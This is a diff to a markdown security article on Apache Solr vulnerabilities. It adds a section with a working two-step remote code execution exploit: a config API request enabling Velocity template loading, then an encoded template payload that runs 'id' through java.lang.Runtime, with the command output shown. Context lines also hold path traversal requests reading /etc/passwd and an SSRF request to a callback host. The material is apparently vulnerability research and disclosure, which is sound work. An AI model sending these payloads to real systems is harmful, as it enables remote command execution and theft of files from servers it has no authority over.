@@ -15,6 +15,7 @@
   * [[CVE-2012-6612, CVE-2013-6407, CVE-2013-6408] XXE in the Update Handler](#4-cve-2012-6612-cve-2013-6407-cve-2013-6408-xxe-in-the-update-handler)
   * [[CVE-2013-6397] Remote Code execution via XSLT response writer and path traversal](#5-cve-2013-6397-remote-code-execution-via-xslt-response-writer-and-path-traversal)
   * [[CVE-2017-3163] Arbitrary file read via path traversal attack in ReplicationHandler](#6-cve-2017-3163-arbitrary-file-read-via-path-traversal-attack-in-replicationhandler)
+  * [[CVE-2019-XXXX] RCE via Velocity template by @_S00pY](#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py)
 * [Black box detection](#black-box-detection)
 * [Conclusion](#conclusion)
 
@@ -346,8 +347,8 @@ In this way we trigger a deserialization attack with the known gadget chain base
 See our [Exploiting JNDI Injections](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) article for more information about JNDI attacks. Solr is based on Jetty, hence the Tomcat trick is not applicable here, but you can rely on remote classloading which was fixed for LDAP just quite recently. 
 
 ### 4. \[CVE-2012-6612, CVE-2013-6407, CVE-2013-6408] XXE in the Update Handler
-**Target Solr version**: 1.3 - 4.1 or 4.3.1
-Requirements: none
+**Target Solr version**: 1.3 - 4.1 or 4.3.1<br>
+**Requirements:** none
 
 If you have a very old version of Solr, it could also be affected by a trivial XXE in the update handler:
 ```http
@@ -367,8 +368,8 @@ Content-Length: 136
 ```
 
 ### 5. \[CVE-2013-6397] Remote Code execution via XSLT response writer and path traversal
-**Target Solr version**: 1.3 - 4.1 or 4.3.1
-Requirements: ability to upload an XLS file to any directory
+**Target Solr version**: 1.3 - 4.1 or 4.3.1<br>
+**Requirements:** ability to upload an XLS file to any directory
 There is a path traversal vulnerability found by [Nicolas Grégoire](https://twitter.com/Agarri_FR) in 2013, he also wrote [a good blogpost](https://www.agarri.fr/blog/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html) about it:
 
 `GET /solr/db/select/?q=31337&wt=xslt&tr=../../../../../../../../../../../../../../../../../usr/share/ant/etc/ant-update.xsl`
@@ -376,14 +377,53 @@ There is a path traversal vulnerability found by [Nicolas Grégoire](https://twi
 It could lead to a remote code execution if an attacked has ability to upload a custom XSL file using the above-mentioned XXE or another vulnerability.
 
 ### 6. \[CVE-2017-3163] Arbitrary file read via path traversal attack in ReplicationHandler
-**Target Solr version**: <5.5.4 and <6.4.1
-Requirements: none
+**Target Solr version**: <5.5.4 and <6.4.1<br>
+**Requirements:** none
 
 `GET /solr/db/replication?command=filecontent&file=../../../../../../../../../../../../../etc/passwd&wt=filestream&generation=1`
 
 There is also an unfixed SSRF here, but with the existence of "shards" feature it's hardly considered as a vulnerability:
 
 `GET /solr/db/replication?command=fetchindex&masterUrl=http://callback/xxxx&wt=json&httpBasicAuthUser=aaa&httpBasicAuthPassword=bbb`
+
+
+### 7. \[CVE-2019-XXXX] RCE via Velocity template by @_S00pY
+**Target Solr version**: >5? (not sure when config API is introduced) - latest (tested on 8.2.0)<br>
+**Requirements:** none
+
+Step 1: Set "params.resource.loader.enabled" as true for the current collection via config API.
+
+```http
+POST /solr/test/config HTTP/1.1
+Host: 127.0.0.1:8983
+Content-Type: application/json
+Content-Length: 259
+
+{
+  "update-queryresponsewriter": {
+    "startup": "lazy",
+    "name": "velocity",
+    "class": "solr.VelocityResponseWriter",
+    "template.base.dir": "",
+    "solr.resource.loader.enabled": "true",
+    "params.resource.loader.enabled": "true"
+  }
+}
+```
+
+Step 2: Trigger the RCE by sending a malicious velocity template in parameters<br>
+`GET /solr/test/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1`
+
+Response:
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Content-Length: 56
+
+     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)
+```
+
+See https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
 
 ## Black box detection
 Considering the attacks explained above, whenever a bug hunter discovers a search form on the website that looks like a full text search, it is worth to send the following OOB payloads to detect the presence of this vulnerability:
@@ -401,6 +441,7 @@ In cases where only a web application who uses Solr is accessible, by exploitati
 ### Special Thanks
 [Nicolas Grégoire](https://twitter.com/Agarri_FR) - for the wonderful CVE-2013-6397<br>
 [Olga Barinova](https://twitter.com/_lely___) - for the incredible idea how to exploit CVE-2017-12629<br>
+[_S00pY](https://twitter.com/_S00pY) - for the astonishing RCE via velocity template<br>
 Apache Solr Team - for timely fixing all of these vulnerabilities
 
 ### Authors
